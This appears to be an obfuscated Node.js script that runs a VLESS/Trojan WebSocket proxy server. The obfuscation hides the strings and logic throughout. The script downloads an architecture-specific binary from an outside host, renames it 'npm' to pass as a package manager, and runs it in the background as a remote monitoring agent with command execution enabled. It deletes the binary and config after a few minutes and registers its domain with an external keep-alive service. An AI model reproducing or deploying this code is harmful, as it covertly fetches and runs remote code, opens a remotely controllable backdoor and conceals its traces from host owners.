function _0x4c5b(){const _0x301924=['application/json','arm64','false','https://','text/html','https://dns.google/resolve?name=','aarch64','text/plain','1379097cnvFgD',':443?security=tls&sni=','8443','type','161AaMLqM','2083','then','substr','npm\x20download\x20successfully','443','1.1.1.1','13352144xwxuzf','arch','hex','4784505eVZiyP','116514MQTxlg','npm\x20is\x20running','SUB_PATH','write','readUInt8','once','replace','crypto','PORT','join','65jJTLTn','buffer','/bin/bash','https://amd64.ssss.nyc.mn/agent','setsid\x20nohup\x20./npm\x20-s\x20','&path=%2F','toString','163112ZVTVLe','createHash','Hug','pipe','https://speed.cloudflare.com/meta','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','Status','Automatic\x20Access\x20Task\x20added\x20successfully','finish','https://arm64.ssss.nyc.mn/v1','every','send','writeHead','Not\x20Found\x0a','npm\x20is\x20already\x20running,\x20skip\x20running...','vless://','readUInt16BE','log','863103wvDQTV','includes','data','map','digest','get','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','url','npm\x20running\x20error:','85660dc9-7474-42df-947d-525f6fb9fb8a','concat','stream','3230830fHtKCA','\x20with\x20all\x20DNS\x20servers','update','https://amd64.ssss.nyc.mn/v1','Hello\x20world!','split','1234.abc.com','reduce','error','NEZHA_KEY','unlink','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','npm','listen','config.yaml','https://arm64.ssss.nyc.mn/agent','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','pop','length','utf-8','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','base64','sha224','&type=A','--tls','index.html','connection','createWriteStream','catch','net','end','true','test','env','trojan://','2053','2096','Failed\x20to\x20resolve\x20','connect','sub','NEZHA_SERVER','Answer','DOMAIN','from','slice','https://oooo.serv00.net/add-url','&fp=chrome&type=ws&host=','NEZHA_PORT','axios','http',':443?encryption=none&security=tls&sni=','client_secret:\x20','UUID','trim'];_0x4c5b=function(){return _0x301924;};return _0x4c5b();}const _0x14b9e7=_0x140c;(function(_0x4754f6,_0x488821){const _0x21aff1=_0x140c,_0x4c90fc=_0x4754f6();while(!![]){try{const _0x5bba9e=-parseInt(_0x21aff1(0x241))/0x1+parseInt(_0x21aff1(0x24d))/0x2+-parseInt(_0x21aff1(0x21d))/0x3+parseInt(_0x21aff1(0x22f))/0x4*(-parseInt(_0x21aff1(0x228))/0x5)+-parseInt(_0x21aff1(0x21e))/0x6*(-parseInt(_0x21aff1(0x213))/0x7)+parseInt(_0x21aff1(0x21a))/0x8+parseInt(_0x21aff1(0x20f))/0x9;if(_0x5bba9e===_0x488821)break;else _0x4c90fc['push'](_0x4c90fc['shift']());}catch(_0x21b610){_0x4c90fc['push'](_0x4c90fc['shift']());}}}(_0x4c5b,0xdacfb));const os=require('os'),http=require(_0x14b9e7(0x202)),fs=require('fs'),axios=require(_0x14b9e7(0x201)),net=require(_0x14b9e7(0x1ee)),path=require('path'),crypto=require(_0x14b9e7(0x225)),{Buffer}=require(_0x14b9e7(0x229)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x14b9e7(0x1f2)][_0x14b9e7(0x205)]||_0x14b9e7(0x24a),NEZHA_SERVER=process[_0x14b9e7(0x1f2)][_0x14b9e7(0x1f9)]||'',NEZHA_PORT=process[_0x14b9e7(0x1f2)][_0x14b9e7(0x200)]||'',NEZHA_KEY=process[_0x14b9e7(0x1f2)][_0x14b9e7(0x256)]||'',DOMAIN=process[_0x14b9e7(0x1f2)][_0x14b9e7(0x1fb)]||_0x14b9e7(0x253),AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![],WSPATH=process[_0x14b9e7(0x1f2)]['WSPATH']||UUID[_0x14b9e7(0x1fd)](0x0,0x8),SUB_PATH=process[_0x14b9e7(0x1f2)][_0x14b9e7(0x220)]||_0x14b9e7(0x1f8),NAME=process[_0x14b9e7(0x1f2)]['NAME']||_0x14b9e7(0x231),PORT=process['env'][_0x14b9e7(0x226)]||0x1eb4;function _0x140c(_0x1e41e6,_0x5eb81a){const _0x4c5bab=_0x4c5b();return _0x140c=function(_0x140cd2,_0x31b9a6){_0x140cd2=_0x140cd2-0x1db;let _0x59964e=_0x4c5bab[_0x140cd2];return _0x59964e;},_0x140c(_0x1e41e6,_0x5eb81a);}let ISP='';const GetISP=async()=>{const _0x5a1906=_0x14b9e7;try{const _0x4677ad=await axios[_0x5a1906(0x246)](_0x5a1906(0x233)),_0x28197f=_0x4677ad[_0x5a1906(0x243)];ISP=(_0x28197f['country']+'-'+_0x28197f['asOrganization'])[_0x5a1906(0x224)](/ /g,'_');}catch(_0x182303){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((_0x1094a9,_0x525e8b)=>{const _0x3a893b=_0x14b9e7;if(_0x1094a9[_0x3a893b(0x248)]==='/'){const _0x1847c3=path['join'](__dirname,_0x3a893b(0x1ea));fs['readFile'](_0x1847c3,'utf8',(_0x5a9c2f,_0x184748)=>{const _0x551116=_0x3a893b;if(_0x5a9c2f){_0x525e8b[_0x551116(0x23b)](0xc8,{'Content-Type':_0x551116(0x20b)}),_0x525e8b['end'](_0x551116(0x251));return;}_0x525e8b[_0x551116(0x23b)](0xc8,{'Content-Type':'text/html'}),_0x525e8b[_0x551116(0x1ef)](_0x184748);});return;}else{if(_0x1094a9[_0x3a893b(0x248)]==='/'+SUB_PATH){const _0x563d17=_0x3a893b(0x23e)+UUID+'@'+DOMAIN+_0x3a893b(0x203)+DOMAIN+_0x3a893b(0x1ff)+DOMAIN+_0x3a893b(0x22d)+WSPATH+'#'+NAME+'-'+ISP,_0x121d9b=_0x3a893b(0x1f3)+UUID+'@'+DOMAIN+_0x3a893b(0x210)+DOMAIN+_0x3a893b(0x1ff)+DOMAIN+_0x3a893b(0x22d)+WSPATH+'#'+NAME+'-'+ISP,_0x1d740f=_0x563d17+'\x0a'+_0x121d9b,_0x17a36c=Buffer[_0x3a893b(0x1fc)](_0x1d740f)[_0x3a893b(0x22e)](_0x3a893b(0x1e6));_0x525e8b[_0x3a893b(0x23b)](0xc8,{'Content-Type':'text/plain'}),_0x525e8b[_0x3a893b(0x1ef)](_0x17a36c+'\x0a');}else _0x525e8b[_0x3a893b(0x23b)](0x194,{'Content-Type':_0x3a893b(0x20e)}),_0x525e8b[_0x3a893b(0x1ef)](_0x3a893b(0x23c));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x14b9e7(0x224)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x14b9e7(0x219)];function resolveHost(_0xe1b363){return new Promise((_0x2d3c77,_0x4aef84)=>{const _0x18d0d0=_0x140c;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x18d0d0(0x1f1)](_0xe1b363)){_0x2d3c77(_0xe1b363);return;}let _0x1fc0ef=0x0;function _0x2c826b(){const _0x52a63a=_0x18d0d0;if(_0x1fc0ef>=DNS_SERVERS[_0x52a63a(0x1e3)]){_0x4aef84(new Error(_0x52a63a(0x1f6)+_0xe1b363+_0x52a63a(0x24e)));return;}const _0x392296=DNS_SERVERS[_0x1fc0ef];_0x1fc0ef++;const _0x1c48af=_0x52a63a(0x20c)+encodeURIComponent(_0xe1b363)+_0x52a63a(0x1e8);axios[_0x52a63a(0x246)](_0x1c48af,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x52a63a(0x215)](_0x1e53b0=>{const _0x546e8=_0x52a63a,_0x29e0e0=_0x1e53b0['data'];if(_0x29e0e0[_0x546e8(0x235)]===0x0&&_0x29e0e0[_0x546e8(0x1fa)]&&_0x29e0e0[_0x546e8(0x1fa)][_0x546e8(0x1e3)]>0x0){const _0x3c6ef4=_0x29e0e0['Answer']['find'](_0x46d814=>_0x46d814[_0x546e8(0x212)]===0x1);if(_0x3c6ef4){_0x2d3c77(_0x3c6ef4[_0x546e8(0x243)]);return;}}_0x2c826b();})[_0x52a63a(0x1ed)](_0x2badc0=>{_0x2c826b();});}_0x2c826b();});}function handleVlessConnection(_0x1cabe8,_0x26e587){const _0x36706c=_0x14b9e7,[_0x1bdea0]=_0x26e587,_0xa87de7=_0x26e587[_0x36706c(0x1fd)](0x1,0x11);if(!_0xa87de7[_0x36706c(0x239)]((_0x109016,_0x5a419f)=>_0x109016==parseInt(uuid[_0x36706c(0x216)](_0x5a419f*0x2,0x2),0x10)))return![];let _0x211fb6=_0x26e587[_0x36706c(0x1fd)](0x11,0x12)[_0x36706c(0x222)]()+0x13;const _0x2a4b8b=_0x26e587[_0x36706c(0x1fd)](_0x211fb6,_0x211fb6+=0x2)['readUInt16BE'](0x0),_0x454513=_0x26e587[_0x36706c(0x1fd)](_0x211fb6,_0x211fb6+=0x1)['readUInt8'](),_0x3868bf=_0x454513==0x1?_0x26e587[_0x36706c(0x1fd)](_0x211fb6,_0x211fb6+=0x4)[_0x36706c(0x227)]('.'):_0x454513==0x2?new TextDecoder()['decode'](_0x26e587[_0x36706c(0x1fd)](_0x211fb6+0x1,_0x211fb6+=0x1+_0x26e587[_0x36706c(0x1fd)](_0x211fb6,_0x211fb6+0x1)['readUInt8']())):_0x454513==0x3?_0x26e587[_0x36706c(0x1fd)](_0x211fb6,_0x211fb6+=0x10)['reduce']((_0x59b9aa,_0x23f37c,_0x286927,_0x2d99b1)=>_0x286927%0x2?_0x59b9aa[_0x36706c(0x24b)](_0x2d99b1[_0x36706c(0x1fd)](_0x286927-0x1,_0x286927+0x1)):_0x59b9aa,[])[_0x36706c(0x244)](_0x36457d=>_0x36457d[_0x36706c(0x23f)](0x0)[_0x36706c(0x22e)](0x10))['join'](':'):'';_0x1cabe8[_0x36706c(0x23a)](new Uint8Array([_0x1bdea0,0x0]));const _0x341c72=createWebSocketStream(_0x1cabe8);return resolveHost(_0x3868bf)[_0x36706c(0x215)](_0x103ccc=>{const _0x253af9=_0x36706c;net[_0x253af9(0x1f7)]({'host':_0x103ccc,'port':_0x2a4b8b},function(){const _0x4052f1=_0x253af9;this[_0x4052f1(0x221)](_0x26e587['slice'](_0x211fb6)),_0x341c72['on'](_0x4052f1(0x255),()=>{})[_0x4052f1(0x232)](this)['on'](_0x4052f1(0x255),()=>{})[_0x4052f1(0x232)](_0x341c72);})['on']('error',()=>{});})[_0x36706c(0x1ed)](_0xdfd10e=>{const _0x31a224=_0x36706c;net[_0x31a224(0x1f7)]({'host':_0x3868bf,'port':_0x2a4b8b},function(){const _0x1b1e46=_0x31a224;this[_0x1b1e46(0x221)](_0x26e587[_0x1b1e46(0x1fd)](_0x211fb6)),_0x341c72['on'](_0x1b1e46(0x255),()=>{})[_0x1b1e46(0x232)](this)['on'](_0x1b1e46(0x255),()=>{})[_0x1b1e46(0x232)](_0x341c72);})['on'](_0x31a224(0x255),()=>{});}),!![];}function handleTrojanConnection(_0x4f7f07,_0x3ea94f){const _0x3d2d65=_0x14b9e7;try{if(_0x3ea94f[_0x3d2d65(0x1e3)]<0x3a)return![];const _0xa4ed0d=_0x3ea94f[_0x3d2d65(0x1fd)](0x0,0x38)['toString'](),_0x32961b=[UUID];let _0x19523c=null;for(const _0x13fc49 of _0x32961b){const _0x5cfe6e=crypto[_0x3d2d65(0x230)](_0x3d2d65(0x1e7))[_0x3d2d65(0x24f)](_0x13fc49)[_0x3d2d65(0x245)](_0x3d2d65(0x21c));if(_0x5cfe6e===_0xa4ed0d){_0x19523c=_0x13fc49;break;}}if(!_0x19523c)return![];let _0x1a8e77=0x38;_0x3ea94f[_0x1a8e77]===0xd&&_0x3ea94f[_0x1a8e77+0x1]===0xa&&(_0x1a8e77+=0x2);const _0x160a18=_0x3ea94f[_0x1a8e77];if(_0x160a18!==0x1)return![];_0x1a8e77+=0x1;const _0x3557e4=_0x3ea94f[_0x1a8e77];_0x1a8e77+=0x1;let _0x2e21d2,_0x25b76f;if(_0x3557e4===0x1)_0x2e21d2=_0x3ea94f[_0x3d2d65(0x1fd)](_0x1a8e77,_0x1a8e77+0x4)[_0x3d2d65(0x227)]('.'),_0x1a8e77+=0x4;else{if(_0x3557e4===0x3){const _0xddafb1=_0x3ea94f[_0x1a8e77];_0x1a8e77+=0x1,_0x2e21d2=_0x3ea94f[_0x3d2d65(0x1fd)](_0x1a8e77,_0x1a8e77+_0xddafb1)['toString'](),_0x1a8e77+=_0xddafb1;}else{if(_0x3557e4===0x4)_0x2e21d2=_0x3ea94f['slice'](_0x1a8e77,_0x1a8e77+0x10)[_0x3d2d65(0x254)]((_0x251a35,_0x4c870a,_0xe061cc,_0x1151b0)=>_0xe061cc%0x2?_0x251a35[_0x3d2d65(0x24b)](_0x1151b0[_0x3d2d65(0x1fd)](_0xe061cc-0x1,_0xe061cc+0x1)):_0x251a35,[])[_0x3d2d65(0x244)](_0x2f7df1=>_0x2f7df1[_0x3d2d65(0x23f)](0x0)[_0x3d2d65(0x22e)](0x10))['join'](':'),_0x1a8e77+=0x10;else return![];}}_0x25b76f=_0x3ea94f[_0x3d2d65(0x23f)](_0x1a8e77),_0x1a8e77+=0x2;_0x1a8e77<_0x3ea94f[_0x3d2d65(0x1e3)]&&_0x3ea94f[_0x1a8e77]===0xd&&_0x3ea94f[_0x1a8e77+0x1]===0xa&&(_0x1a8e77+=0x2);const _0x1aeb9d=createWebSocketStream(_0x4f7f07);return resolveHost(_0x2e21d2)[_0x3d2d65(0x215)](_0x241ab1=>{const _0x1bc3ad=_0x3d2d65;net['connect']({'host':_0x241ab1,'port':_0x25b76f},function(){const _0x381b47=_0x140c;_0x1a8e77<_0x3ea94f[_0x381b47(0x1e3)]&&this[_0x381b47(0x221)](_0x3ea94f['slice'](_0x1a8e77)),_0x1aeb9d['on']('error',()=>{})[_0x381b47(0x232)](this)['on'](_0x381b47(0x255),()=>{})[_0x381b47(0x232)](_0x1aeb9d);})['on'](_0x1bc3ad(0x255),()=>{});})[_0x3d2d65(0x1ed)](_0xdbee01=>{const _0xc60cea=_0x3d2d65;net[_0xc60cea(0x1f7)]({'host':_0x2e21d2,'port':_0x25b76f},function(){const _0x5f5a61=_0xc60cea;_0x1a8e77<_0x3ea94f[_0x5f5a61(0x1e3)]&&this[_0x5f5a61(0x221)](_0x3ea94f[_0x5f5a61(0x1fd)](_0x1a8e77)),_0x1aeb9d['on']('error',()=>{})['pipe'](this)['on'](_0x5f5a61(0x255),()=>{})['pipe'](_0x1aeb9d);})['on'](_0xc60cea(0x255),()=>{});}),!![];}catch(_0x5429d0){return![];}}wss['on'](_0x14b9e7(0x1eb),(_0x2cf16f,_0x297a8e)=>{const _0x21bfd2=_0x14b9e7,_0x57d3a1=_0x297a8e[_0x21bfd2(0x248)]||'';_0x2cf16f[_0x21bfd2(0x223)]('message',_0x29989a=>{const _0x756796=_0x21bfd2;if(_0x29989a['length']>0x11&&_0x29989a[0x0]===0x0){const _0xdada19=_0x29989a[_0x756796(0x1fd)](0x1,0x11),_0x10a64b=_0xdada19[_0x756796(0x239)]((_0x54b33d,_0x43e9cd)=>_0x54b33d==parseInt(uuid[_0x756796(0x216)](_0x43e9cd*0x2,0x2),0x10));if(_0x10a64b){!handleVlessConnection(_0x2cf16f,_0x29989a)&&_0x2cf16f['close']();return;}}!handleTrojanConnection(_0x2cf16f,_0x29989a)&&_0x2cf16f['close']();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x271f27=_0x14b9e7,_0x1427ba=os[_0x271f27(0x21b)]();return _0x1427ba==='arm'||_0x1427ba===_0x271f27(0x208)||_0x1427ba===_0x271f27(0x20d)?!NEZHA_PORT?_0x271f27(0x238):_0x271f27(0x1e0):!NEZHA_PORT?_0x271f27(0x250):_0x271f27(0x22b);},downloadFile=async()=>{const _0x37674c=_0x14b9e7;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2a9832=getDownloadUrl(),_0x4f81a5=await axios({'method':_0x37674c(0x246),'url':_0x2a9832,'responseType':_0x37674c(0x24c)}),_0xbbb4f5=fs[_0x37674c(0x1ec)](_0x37674c(0x1dd));return _0x4f81a5['data'][_0x37674c(0x232)](_0xbbb4f5),new Promise((_0x150d3f,_0x3ce616)=>{const _0x50ab0f=_0x37674c;_0xbbb4f5['on'](_0x50ab0f(0x237),()=>{const _0x2d54fd=_0x50ab0f;console[_0x2d54fd(0x240)](_0x2d54fd(0x217)),exec('chmod\x20+x\x20npm',_0x5526c1=>{if(_0x5526c1)_0x3ce616(_0x5526c1);_0x150d3f();});}),_0xbbb4f5['on'](_0x50ab0f(0x255),_0x3ce616);});}catch(_0x15617b){throw _0x15617b;}},runnz=async()=>{const _0x255c1f=_0x14b9e7;try{const _0x1fa9fb=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x255c1f(0x1e4)});if(_0x1fa9fb[_0x255c1f(0x206)]()!==''){console[_0x255c1f(0x240)](_0x255c1f(0x23d));return;}}catch(_0x428d3c){}await downloadFile();let _0x1a310b='',_0x1805e1=[_0x255c1f(0x218),_0x255c1f(0x211),_0x255c1f(0x1f5),'2087',_0x255c1f(0x214),_0x255c1f(0x1f4)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3e5f4d=_0x1805e1[_0x255c1f(0x242)](NEZHA_PORT)?_0x255c1f(0x1e9):'';_0x1a310b=_0x255c1f(0x22c)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x3e5f4d+_0x255c1f(0x1dc);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x53ed56=NEZHA_SERVER[_0x255c1f(0x242)](':')?NEZHA_SERVER[_0x255c1f(0x252)](':')[_0x255c1f(0x1e2)]():'',_0x2eec59=_0x1805e1['includes'](_0x53ed56)?_0x255c1f(0x1f0):_0x255c1f(0x209),_0xbb9fbf=_0x255c1f(0x204)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x255c1f(0x247)+_0x2eec59+_0x255c1f(0x1e1)+UUID;fs['writeFileSync'](_0x255c1f(0x1df),_0xbb9fbf);}_0x1a310b=_0x255c1f(0x234);}else{console[_0x255c1f(0x240)](_0x255c1f(0x1e5));return;}}try{exec(_0x1a310b,{'shell':_0x255c1f(0x22a)},_0xe8e5e6=>{const _0x50c4f5=_0x255c1f;if(_0xe8e5e6)console[_0x50c4f5(0x255)](_0x50c4f5(0x249),_0xe8e5e6);else console[_0x50c4f5(0x240)](_0x50c4f5(0x21f));});}catch(_0x229482){console[_0x255c1f(0x255)]('error:\x20'+_0x229482);}};async function addAccessTask(){const _0x5b39e2=_0x14b9e7;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x419086=_0x5b39e2(0x20a)+DOMAIN;try{const _0x5bc1c7=await axios['post'](_0x5b39e2(0x1fe),{'url':_0x419086},{'headers':{'Content-Type':_0x5b39e2(0x207)}});console[_0x5b39e2(0x240)](_0x5b39e2(0x236));}catch(_0x210a9b){}}const delFiles=()=>{const _0x2ae3ad=_0x14b9e7;fs[_0x2ae3ad(0x1db)](_0x2ae3ad(0x1dd),()=>{}),fs[_0x2ae3ad(0x1db)](_0x2ae3ad(0x1df),()=>{});};httpServer[_0x14b9e7(0x1de)](PORT,()=>{const _0x4d261b=_0x14b9e7;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x4d261b(0x240)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
